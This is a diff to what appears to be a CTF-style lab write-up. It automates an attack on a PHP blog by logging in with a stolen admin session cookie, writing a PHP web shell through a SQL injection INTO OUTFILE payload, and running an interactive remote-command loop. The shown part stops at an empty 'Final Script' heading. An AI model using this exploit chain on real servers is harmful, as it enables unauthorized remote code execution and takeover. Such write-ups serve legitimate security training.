@@ -515,3 +515,81 @@ root@debian:/var/www/css#
 <br/>
 
 And yes finally we got rce so let's try to update our script and automate everything upto shell...
+
+**RECAP**
+We got the cookie from the admin and now we will make function ```login_admin()``` to login by the session cookie
+
+**login_admin() function
+
+```python
+def login_admin(cookie):
+    url=target_url+"admin/index.php"
+    cookie="PHPSESSID={}".format(cookie)
+    head={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+'Accept-Language': 'en-US,en;q=0.5',
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'close',
+'Cookie': cookie}
+
+    proxy={'http':'127.0.0.1:8080'}
+    a=r.get(url,headers=head)
+    if a.text.find("Administration of my Blog"):
+        print("[+] Login Successful")
+        shell_upload(r,head)
+    else:
+        print("[-] Login Failed")
+        sys.exit()
+```
+
+So here this function took cookie as argument and created custom headers (**Important:- I tried to just pass cookie directly but it doesn't work like that idk why lol so i just intercepted that process with burp and duplicate the headers**)
+
+And you might notice that ```proxy``` that is for me to catch my request from my script in burp so that i can analyse and make changes...
+
+So we sent everything and tested if we got ```Administration of my Blog``` in response or not because this heading appears when we login as admin so after that ```shell_upload``` function is invoked to upload our shell...
+
+**shell_upload function**
+
+```python
+def shell_upload(r,head):
+    url=target_url+"admin/edit.php?id=-1%20union%20select%20\"<?php\",\"system($_GET[%27c%27]);\",\"?>\",\";\"%20into%20outfile%20\"/var/www/css/lol.php\"%23"
+    #url=target_url+"admin/"
+    r.get(url,headers=head)
+    shell_url=url+"css/lol.php"
+    test=r.get(shell_url,headers=head)
+    if test.text.find("Notice: Undefined index:"):
+        print("[+] Shell uploaded")
+        shell_interact(r,head)
+    else:
+        print("[-] Shell upload failed")
+        sys.exit()
+```
+
+Here we just uploaded the shell as we did in browser but with requests and all the headers so after sending everything we checked by opening the shell without ```c``` parameter which always gives output which had ```Notice: Undefined index:``` in it 
+</br/>
+<<selection 016>>
+<br/>
+
+After that ```shell_interact``` function is invoked 
+
+**shell_interact**
+
+```python
+def shell_interact(r,head):
+    proxy={'http':'127.0.0.1:8080'}
+    shell_url=target_url+"css/lol.php"
+    while True:
+        cmd=input("cmd>")
+        if cmd=="exit":
+            url=shell_url+"?c=rm lol.php"
+            r.get(url)
+            sys.exit()
+        else:
+            url=shell_url+"?c={}".format(cmd)
+        print(r.get(url,headers=head).text.replace(";",""))
+```
+
+This will just take input in ```cmd``` variable and execute it on server by ```lol.php``` and give us output after some cleaning ...
+
+### Final Script
+
